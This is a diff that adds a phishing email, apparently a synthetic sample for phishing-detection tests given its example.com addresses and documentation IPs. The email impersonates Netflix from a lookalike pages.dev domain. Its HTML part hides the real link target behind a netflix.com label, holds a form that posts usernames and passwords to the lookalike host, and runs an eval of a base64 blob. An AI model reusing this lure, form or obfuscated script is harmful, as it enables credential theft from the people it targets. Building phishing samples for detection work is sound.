@@ -1,0 +1,32 @@
+From: notice@netflix-account.pages.dev
+To: victim17@example.com
+Subject: Monthly statement available [ref UAF9A3D]
+Date: Tue, 26 Mar 2002 09:17:00 -0500
+Message-ID: <phish-77-6c85b0d1-ba3f-4725-ac5c-11f4d69c51db@netflix-account.pages.dev>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 27 Mar 2002 15:38:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 09 Mar 2002 12:02:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 18 Mar 2002 07:26:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 23 Mar 2002 20:28:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 24 Mar 2002 20:41:00 -0500
+Return-Path: <notice@netflix-account.pages.dev>
+Reply-To: notice@netflix-account.pages.dev
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=netflix-account.pages.dev; dkim=pass header.d=netflix-account.pages.dev; dmarc=pass header.from=netflix-account.pages.dev
+Received-SPF: pass (mx.example.com: domain of notice@netflix-account.pages.dev designates 192.0.2.57 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=netflix-account.pages.dev; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-77-6dc291dc"
+
+--bnd-p-77-6dc291dc
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+Your monthly statement is ready. Open the link below.
+https://netflix-account.pages.dev/statement/UAF9A3D
+
+Reference: UAF9A3D
+--bnd-p-77-6dc291dc
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>Your monthly statement is ready. Open the link below.<br/>https://netflix-account.pages.dev/statement/UAF9A3D<br/><br/>Reference: UAF9A3D</p><p><a href="http://netflix-account.pages.dev/login">https://www.netflix.com/signin</a></p><form action="http://netflix-account.pages.dev/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-77-6dc291dc--
